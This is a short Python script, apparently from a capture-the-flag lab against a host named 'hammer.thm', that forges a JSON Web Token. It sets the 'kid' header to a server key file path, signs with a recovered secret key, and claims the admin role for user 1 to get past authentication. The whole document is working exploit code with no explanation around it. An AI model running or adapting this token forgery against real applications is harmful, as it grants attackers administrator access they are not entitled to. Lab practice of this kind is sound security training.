import jwt

# Custom Header with "kid"
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

# Payload with custom claims
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1732332761,
    "exp": 1732336361,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

# The known key content
key = "56058354efb3daa97ebab00fabd7a7d7"

# Generate the JWT
token = jwt.encode(payload, key, algorithm="HS256", headers=header)

print(f"Generated JWT: {token}")
